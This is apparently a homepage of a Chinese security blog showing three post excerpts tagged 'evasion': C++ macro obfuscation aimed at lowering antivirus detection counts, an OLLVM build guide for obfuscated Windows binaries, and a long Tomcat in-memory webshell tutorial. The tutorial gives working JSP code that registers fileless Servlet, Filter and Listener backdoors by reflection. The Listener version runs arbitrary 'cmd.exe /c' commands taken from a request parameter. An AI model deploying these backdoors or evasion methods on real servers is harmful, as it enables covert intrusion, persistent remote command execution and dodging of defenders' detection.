
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>Arcueid&#39;s BLOG</title>
    <meta name="author" content="Arcueid" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/Arcueid.jpg" />
    <link rel="preconnect" href="https://cdn.staticfile.net" />
<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>


<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
<script src="/js/lib/math.js"></script>


<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>ARCUEID&#39;S BLOG</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;ARCUEID&#39;S BLOG</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>Arcueid&#39;s BLOG</h1>
                <h3></h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2024/03/26/%E6%BA%90%E7%A0%81%E6%B7%B7%E6%B7%86/">
        <h2 class="post-title">源码混淆</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/26
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="c-源码混淆"><a href="#c-源码混淆" class="headerlink" title="c++源码混淆"></a>c++源码混淆</h1><p>ollvm VT 14 &#x2F; 72</p>
<p>直接编译  10 &#x2F; 72 </p>
<p>是ollvm特征太明显了还是什么原因吗?</p>
<p>那么研究研究手动混淆 </p>
<h2 id="函数名及变量名的混淆"><a href="#函数名及变量名的混淆" class="headerlink" title="函数名及变量名的混淆"></a>函数名及变量名的混淆</h2><p>使用宏替换（#define）就可以了</p>
<pre><code class="cpp">#ifndef _OBFUS_H_
#define _OBFUS_H_

#define OBFUSCATION_CODE
#ifdef OBFUSCATION_CODE

//main.cpp
#define md5sum                            l1o
#define md5_value                         l10
#define func_val                          l11
#define func_val                          l12
#define func_val                          l13
#define func_val                          l14
#define func_val                          l15
#define func_val                          l16
#define func_val                          l17
#define func_val                          l18
#define func_val                          l19
//other.cpp
#define func_val                          l1lo
#define func_val                          l1l0
#define func_val                          l1l1
#define func_val                          l1l2
#define func_val                          l1l3
#define func_val                          l1l4
#define func_val                          l1l5
#define func_val                          l1l6
#define func_val                          l1l7
#define func_val                          l1l8
#define func_val                          l1l9

#endif //OBFUSCATION_CODE
#endif //_OBFUS_H_
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/evasion/" style="color: #00a596">evasion</a>
        </span>
        
    </div>
    <a href="/2024/03/26/%E6%BA%90%E7%A0%81%E6%B7%B7%E6%B7%86/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/03/19/Ubuntu20.04%20%E9%85%8D%E7%BD%AEOLLVM%E7%8E%AF%E5%A2%83/">
        <h2 class="post-title">OLLVM</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/19
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>虚拟机配置: 4g 40g</p>
<h2 id="增加源"><a href="#增加源" class="headerlink" title="增加源"></a>增加源</h2><pre><code>deb [arch=amd64] http://archive.ubuntu.com/ubuntu focal main universe
</code></pre>
<h2 id="安装cmake"><a href="#安装cmake" class="headerlink" title="安装cmake"></a>安装cmake</h2><pre><code class="bash">sudo apt-get install cmake -y
</code></pre>
<h2 id="安装gcc8"><a href="#安装gcc8" class="headerlink" title="安装gcc8"></a>安装gcc8</h2><pre><code class="bash">sudo apt-get install gcc-8 g++-8 -y
</code></pre>
<h2 id="切换为默认版本"><a href="#切换为默认版本" class="headerlink" title="切换为默认版本"></a>切换为默认版本</h2><pre><code>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 100 --slave /usr/bin/g++ g++ /usr/bin/g++-8 --slave /usr/bin/gcov gcov /usr/bin/gcov-8
</code></pre>
<h2 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h2><pre><code>git clone -b llvm-4.0  https://github.com/obfuscator-llvm/obfuscator.git
cd obfuscator/
</code></pre>
<pre><code class="bash">vim include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h
修改源码 char为uint8_t
Expected&lt;std::vector&lt;uint8_t&gt;&gt; readMem(char *Dst, JITTargetAddress Src,
                                      uint64_t Size) &#123;
    // Check for an &#39;out-of-band&#39; error, e.g. from an MM destructor.
    if (ExistingError)
      return std::move(ExistingError);

    return callB&lt;ReadMem&gt;(Src, Size);
  &#125;
</code></pre>
<p>编译</p>
<pre><code class="bash">mkdir build
cd build
cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ../
make -j4
sudo make install 
</code></pre>
<p>make失败了多试几次 内存拉大点</p>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int encryptFunc(int inputNum_1,int inputNum_2)&#123;
    int tmpNum_1 = 666, tmpNum_2 = 888, tmpNum_3 = 777;
    return tmpNum_1 ^ tmpNum_2 + tmpNum_3 * inputNum_1 - inputNum_2;
&#125;

int main(int argc,char *argv[])&#123;

    int printNum = 55;
    if (argc &gt; 1)
    &#123;
        printNum = encryptFunc(printNum, atoi(argv[1]));
    &#125;else&#123;
        printNum = encryptFunc(printNum, argc);
    &#125;
    
    printf(&quot;Hello OLLVM %d\r\n&quot;, printNum);

    return 0;
&#125;
</code></pre>
<pre><code class="bash">clang -mllvm -sub -mllvm -sub_loop=3  -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 -mllvm -fla -mllvm -split -mllvm -split_num=3 a.cpp -o a.exe
</code></pre>
<p>这样就实现了linux下elf文件的编译</p>
<p>那么假如我们想要windows的呢</p>
<p>​	windows OLLVM太鸡巴难配了 系统恢复之后就没配成功过了</p>
<p>那么我们需要minGW交叉编译</p>
<pre><code class="bash">sudo apt-get install mingw-w64
</code></pre>
<p>安装完再次测试</p>
<pre><code class="bash"> clang -target x86_64-w64-windows-gnu  -mllvm -sub -mllvm -sub_loop=3  -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 -mllvm -fla -mllvm -split -mllvm -split_num=3 a.cpp -o a.exe
</code></pre>
<p>报错 找不到啥几把路径</p>
<p>指定一下就好了</p>
<pre><code class="bash">clang -target x86_64-w64-mingw32  -mllvm -sub -mllvm -sub_loop=3  -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 -mllvm -fla -mllvm -split -mllvm -split_num=3  -L /usr/lib/gcc/x86_64-w64-mingw32/10-posix/ a.cpp -o a.exe 
</code></pre>
<p>混淆效果如下</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403192209481.png" alt="image-20240319220917273"></p>
<p>证实可运行</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403192209559.png" alt="image-20240319220950472"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/evasion/" style="color: #ff7d73">evasion</a>
        </span>
        
    </div>
    <a href="/2024/03/19/Ubuntu20.04%20%E9%85%8D%E7%BD%AEOLLVM%E7%8E%AF%E5%A2%83/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/03/14/TomcatMemShell/">
        <h2 class="post-title">TomcatMemShell</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/3/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="MemShell"><a href="#MemShell" class="headerlink" title="MemShell"></a>MemShell</h1><p>一句话</p>
<p><code>利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门</code></p>
<h2 id="基础认知"><a href="#基础认知" class="headerlink" title="基础认知"></a>基础认知</h2><p>内存马又名无文件马，见名知意，指的是无文件落地的webshell</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401211532045.png" alt="图片"></p>
<h2 id="内存马有什么用"><a href="#内存马有什么用" class="headerlink" title="内存马有什么用"></a>内存马有什么用</h2><p>在不能反弹shell的时候可以用内存马</p>
<p>规避部分查杀 </p>
<p>服务器上有防篡改 目录监控 没有写权限</p>
<p>使用springboot无法解析传统webshell</p>
<h1 id="传统内存马"><a href="#传统内存马" class="headerlink" title="传统内存马"></a>传统内存马</h1><h2 id="基于Servlet的MemShell"><a href="#基于Servlet的MemShell" class="headerlink" title="基于Servlet的MemShell"></a>基于Servlet的MemShell</h2><p>tomcat在解析完web.xml后在ContextConfig#configureContext方法中注册servlet filter listener</p>
<p>打断点我们可以看看大概的servlet注册流程</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345700.png" alt="image-20240306134511599"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345087.png" alt="image-20240306134528055"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345077.png" alt="image-20240306134542046"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061345357.png" alt="image-20240306134555328"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061422236.png" alt="image-20240306142203198"></p>
<p>发现并没有进行Servlet的实例化</p>
<p>因为预加载没有开 要在第一次访问的时候才会实例化</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061347772.png" alt="image-20240306134732713"></p>
<p>所以后面还需要解决实例化的问题</p>
<p><code>先写个jsp马 再动态注册</code></p>
<p>这就是内存马</p>
<p>我们考虑动态注册的问题</p>
<p>首先要拿到前文的context对象 (StandardContext)</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061413241.png" alt="image-20240306141321192"></p>
<p>可以通过requestFacade反射拿到Request对象</p>
<p>在Request对象的mappingData.context中可以拿到StandardContext对象</p>
<p>Request的getContext方法就是这么拿的 直接调方法即可</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061415700.png" alt="image-20240306141508625"></p>
<pre><code class="java">Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
fieldRequest.setAccessible(true);
Request req = (Request) fieldRequest.get(request);
StandardContext context = (StandardContext) req.getContext();
</code></pre>
<p>拿到context之后只需要把tomcat解析xml时注册servlet做的事情做一遍就行了</p>
<pre><code class="jsp">&lt;%
// 动态注册
    try &#123;
        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
        fieldRequest.setAccessible(true);
        Request req = null;
        try &#123;
            req = (Request) fieldRequest.get(request);
        &#125; catch (IllegalAccessException e) &#123;
            throw new RuntimeException(e);
        &#125;
        StandardContext context = (StandardContext) req.getContext();
        Servlet servlet = new MemShell();
        Wrapper wrapper = context.createWrapper();
        wrapper.setName(&quot;EvilServlet&quot;);
        wrapper.setServletClass(servlet.getClass().getSimpleName());
        wrapper.setServlet(servlet);
        context.addChild(wrapper);
        context.addServletMappingDecoded(&quot;/shell&quot;, &quot;EvilServlet&quot;);


    &#125; catch (NoSuchFieldException e) &#123;
        e.printStackTrace();
    &#125;
%&gt;
</code></pre>
<p>值得注意的是这里额外多调的一个方法</p>
<p><code>wrapper.setServlet(servlet);</code></p>
<p>是为了解决实例化的问题的</p>
<pre><code class="jsp">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;

&lt;%!
    public class MemShell extends HttpServlet&#123;
        @Override
        public void destroy() &#123;
            super.destroy();
        &#125;

        @Override
        public void init() throws ServletException &#123;
            super.init();
        &#125;

        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;
            Runtime.getRuntime().exec(&quot;calc&quot;);
        &#125;
    &#125;
%&gt;

&lt;%
// 动态注册
    try &#123;
        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
        fieldRequest.setAccessible(true);
        Request req = null;
        try &#123;
            req = (Request) fieldRequest.get(request);
        &#125; catch (IllegalAccessException e) &#123;
            throw new RuntimeException(e);
        &#125;
        StandardContext context = (StandardContext) req.getContext();
        Servlet servlet = new MemShell();
        Wrapper wrapper = context.createWrapper();
        wrapper.setName(&quot;EvilServlet&quot;);
        wrapper.setServletClass(servlet.getClass().getSimpleName());
        wrapper.setServlet(servlet);
        context.addChild(wrapper);
        context.addServletMappingDecoded(&quot;/shell&quot;, &quot;EvilServlet&quot;);


    &#125; catch (NoSuchFieldException e) &#123;

        e.printStackTrace();
    &#125;
%&gt;
</code></pre>
<p>先访问servlet.jsp注册</p>
<p>然后访问shell触发</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403061430763.png" alt="image-20240306143054673"></p>
<h2 id="基于Filter的MemShell"><a href="#基于Filter的MemShell" class="headerlink" title="基于Filter的MemShell"></a>基于Filter的MemShell</h2><p>先写个常规的filter弹计算器</p>
<pre><code class="java">package com.arcueid;

import javax.servlet.*;
import java.io.IOException;

public class FilterTest implements Filter &#123;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException &#123;

    &#125;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;
        chain.doFilter(request,response);
        Runtime.getRuntime().exec(&quot;calc&quot;);
    &#125;

    @Override
    public void destroy() &#123;

    &#125;
&#125;
</code></pre>
<p>在doFilter上下断点</p>
<p>跟进doFilter 会进入internalDoFilter</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070721492.png" alt="image-20240307072122381"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070721239.png" alt="image-20240307072158991"></p>
<p>这里n是filterchain.length</p>
<p>这一段的意思也就是从filters中一个个取出filterConfig</p>
<p>我们看看filters变量</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070725671.png" alt="image-20240307072542614"></p>
<p>有两个 一个是我们自定义的 另一个是tomcat自带的</p>
<p>在filterConfig中看看</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070726496.png" alt="image-20240307072647432"></p>
<p>里面配置了filter的类和名字</p>
<p>然后进行了dofilter</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403070728932.png" alt="image-20240307072826873"></p>
<p>也就是</p>
<pre><code>filterConfig.getFilter().doFilter()
</code></pre>
<p>filterConfig是遍历filters得到的</p>
<p>而filters存储在ApplicationFilterChain类中</p>
<p>我们看看ApplicationFilterChain是怎么来的</p>
<p>在StandardWrapperValve中</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071206280.png" alt="image-20240307120650218"></p>
<p>在后面调用doFilter进入第一个过滤器</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071207878.png" alt="image-20240307120727826"></p>
<p>那么这个FilterChain对象是如何获取filert的相关信息的呢？</p>
<p>在下文并没有对filterChain的属性进行修改 说明在实例化的时候已经获取了相应的值</p>
<p>跟进ApplicationFilterFactory#createFilterChain</p>
<pre><code class="java">StandardContext context = (StandardContext)wrapper.getParent();
            FilterMap[] filterMaps = context.findFilterMaps();
            if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;
                DispatcherType dispatcher = (DispatcherType)request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;);
                String requestPath = null;
                Object attribute = request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;);
                if (attribute != null) &#123;
                    requestPath = attribute.toString();
                &#125;

                String servletName = wrapper.getName();
                FilterMap[] var10 = filterMaps;
                int var11 = filterMaps.length;

                int var12;
                FilterMap filterMap;
                ApplicationFilterConfig filterConfig;
                for(var12 = 0; var12 &lt; var11; ++var12) &#123;
                    filterMap = var10[var12];
                    if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;
                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                        if (filterConfig != null) &#123;
                            filterChain.addFilter(filterConfig);
                        &#125;
                    &#125;
                &#125;

                var10 = filterMaps;
                var11 = filterMaps.length;

                for(var12 = 0; var12 &lt; var11; ++var12) &#123;
                    filterMap = var10[var12];
                    if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;
                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                        if (filterConfig != null) &#123;
                            filterChain.addFilter(filterConfig);
                        &#125;
                    &#125;
                &#125;

                return filterChain;
            &#125; else &#123;
                return filterChain;
            &#125;
</code></pre>
<p>主要是这里</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071213636.png" alt="image-20240307121326305"></p>
<p>从filterMap中取值 为filter配置filtername 和 patternurl</p>
<p>我们可以通过addFilterMapBefore方法来添加Filter</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071230184.png" alt="image-20240307123030097"></p>
<p>先调用了validateFilterMap</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071231926.png" alt="image-20240307123159551"></p>
<p>这是一个检测合法性的方法</p>
<p>从这里我们可以知道想要合法 首先要有FilterDef </p>
<p>所以我们还需要自定义FilterDef 并添加到 FilterDefs</p>
<p>可以在init处打断点进去看看</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403062229885.png" alt="image-20240306222618007"></p>
<p>filterDefs是一个hashMap 对应过滤器名称和filterDef对象</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403062237924.png" alt="image-20240306223721885"></p>
<p>通过遍历从filterDefs中获取key和value，将value封装为ApplicationFilterConfig对象放入filterConfigs变量中。</p>
<p>实际上存在方法<code>StandardContext#addFilterDef</code></p>
<p>可以添加进FilterDefs</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071239202.png" alt="image-20240307123901024"></p>
<p>filterConfigs没有类似的方法 要手动反射去改</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403071252848.png" alt="image-20240307125242753"></p>
<p>于是我们可以写出如下代码</p>
<pre><code class="jsp">&lt;%
    String filterName = &quot;EvilFilter&quot;;
    EvilFilter filter = new EvilFilter();

    FilterMap filterMap = new FilterMap();
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    filterMap.addURLPattern(&quot;/*&quot;);

    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterClass(filter.getClass().getSimpleName());
    filterDef.setFilterName(filterName);

    Constructor&lt;ApplicationFilterConfig&gt; cons = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    cons.setAccessible(true);


    try &#123;
        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
        fieldRequest.setAccessible(true);
        Request req = (Request) fieldRequest.get(request);
        StandardContext context = (StandardContext) req.getContext();

        Field fieldFilterConfigs = context.getClass().getDeclaredField(&quot;filterConfigs&quot;);
        fieldFilterConfigs.setAccessible(true);
        Map filterConfigs = (Map)fieldFilterConfigs.get(context);

        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
        ApplicationFilterConfig filterConfig = cons.newInstance(context, filterDef);
        filterConfigs.put(filterName,filterConfig);
    &#125; catch (NoSuchFieldException e) &#123;
        throw new RuntimeException(e);
    &#125;

%&gt;
</code></pre>
<h2 id="基于Listener的MemShell"><a href="#基于Listener的MemShell" class="headerlink" title="基于Listener的MemShell"></a>基于Listener的MemShell</h2><pre><code class="ini">ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
ServletRequestListener：对 Request 请求进行监听（创建、销毁）
ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听
</code></pre>
<p>我们在requestInitialized下断点</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401212113217.png" alt="image-20240121211323125"></p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401221057966.png" alt="image-20240122105551243"></p>
<p>我们看到listener是在StandardContext#getApplicationEventListeners方法中获得</p>
<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202401221058804.png" alt="image-20240122105812713"></p>
<p>因此利用思路也很简单，可以通过StandardContext#addApplicationEventListener方法，add我们自己写的恶意listener</p>
<p>考虑如下代码</p>
<pre><code class="java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;
&lt;%@ page import=&quot;java.util.stream.Collectors&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;

&lt;%!
    public class EvilListener implements ServletRequestListener&#123;
        @Override
        public void requestDestroyed(ServletRequestEvent sre) &#123;
            HttpServletRequest servletRequest = (HttpServletRequest)sre.getServletRequest();
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            BufferedReader br = null;
            if (cmd != null) &#123;
                InputStream in = null;
                try &#123;
                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
                &#125; catch (IOException e) &#123;
                    throw new RuntimeException(e);
                &#125;
                br = new BufferedReader(new InputStreamReader(in));
                Field fieldRequest = null;
                try &#123;
                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
                &#125; catch (NoSuchFieldException e) &#123;
                    throw new RuntimeException(e);
                &#125;
                fieldRequest.setAccessible(true);
                Response response = null;
                try &#123;
                    response = ((Request) fieldRequest.get(servletRequest)).getResponse();
                &#125; catch (IllegalAccessException e) &#123;
                    throw new RuntimeException(e);
                &#125;
                try &#123;
                    response.getWriter().write(br.lines().collect(Collectors.joining(&quot;\n&quot;)));
                &#125; catch (IOException e) &#123;
                    throw new RuntimeException(e);
                &#125;
            &#125;
        &#125;

        @Override
        public void requestInitialized(ServletRequestEvent sre) &#123;&#125;
    &#125;


%&gt;

&lt;%
    try &#123;
        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
        fieldRequest.setAccessible(true);
        Request req = (Request) fieldRequest.get(request);
        StandardContext context = (StandardContext) req.getContext();
        context.addApplicationEventListener(new EvilListener());
    &#125; catch (NoSuchFieldException e) &#123;
        throw new RuntimeException(e);
    &#125;

%&gt;
</code></pre>
<p>分为两块 上面一块就是RCE</p>
<p>下面一块是添加listener</p>
<p>先从下面这块开始看</p>
<pre><code class="jsp">&lt;%
    try &#123;
        Field fieldRequest = request.getClass().getDeclaredField(&quot;request&quot;);
        fieldRequest.setAccessible(true);
        Request req = (Request) fieldRequest.get(request);
        StandardContext context = (StandardContext) req.getContext();
        context.addApplicationEventListener(new EvilListener());
    &#125; catch (NoSuchFieldException e) &#123;
        throw new RuntimeException(e);
    &#125;

%&gt;
</code></pre>
<p>这块的目的就是上面说的 添加listener</p>
<p>然后看上面的</p>
<p>由于ServletRequestEvent至提供了ServletRequest，并没有提供Response，因此需要通过反射获取 Response</p>
<pre><code class="java">&lt;%!
    public class EvilListener implements ServletRequestListener&#123;
        @Override
        public void requestDestroyed(ServletRequestEvent sre) &#123;
            HttpServletRequest servletRequest = (HttpServletRequest)sre.getServletRequest();
            String cmd = servletRequest.getParameter(&quot;cmd&quot;);
            BufferedReader br = null;
            if (cmd != null) &#123;
                InputStream in = null;
                try &#123;
                    in = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;,cmd&#125;).getInputStream();
                &#125; catch (IOException e) &#123;
                    throw new RuntimeException(e);
                &#125;
                br = new BufferedReader(new InputStreamReader(in));
                Field fieldRequest = null;
                try &#123;
                    fieldRequest = servletRequest.getClass().getDeclaredField(&quot;request&quot;);
                &#125; catch (NoSuchFieldException e) &#123;
                    throw new RuntimeException(e);
                &#125;
                fieldRequest.setAccessible(true);
                Response response = null;
                try &#123;
                    response = ((Request) fieldRequest.get(servletRequest)).getResponse();
